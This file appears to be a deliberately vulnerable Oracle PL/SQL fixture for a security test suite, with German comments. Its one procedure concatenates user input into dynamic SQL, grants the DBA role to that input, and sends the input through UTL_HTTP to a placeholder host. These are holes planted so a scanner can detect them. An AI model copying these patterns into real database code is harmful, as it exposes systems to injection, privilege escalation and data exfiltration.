-- oracle_vulnerable.sql
-- Absichtlich unsicheres Oracle-PL/SQL fuer die ACI-Testsuite.
-- Loest mehrere Sicherheits-Checks aus (SQL-Injection, dynamische DDL,
-- unerwuenschtes Paket).

CREATE OR REPLACE PROCEDURE search_employees (p_name IN VARCHAR2) IS
   l_sql   VARCHAR2(4000);
   l_count NUMBER;
BEGIN
   -- SQL-Injection: Benutzereingabe per Konkatenation in dynamisches SQL
   l_sql := 'SELECT COUNT(*) FROM employees WHERE last_name = ' || p_name;
   EXECUTE IMMEDIATE l_sql INTO l_count;

   -- Dynamische DDL: Rechteausweitung
   EXECUTE IMMEDIATE 'GRANT DBA TO ' || p_name;

   -- Ausgehende HTTP-Verbindung - moegliche Datenexfiltration
   l_count := UTL_HTTP.REQUEST('http://example.org/' || p_name);
END search_employees;
/
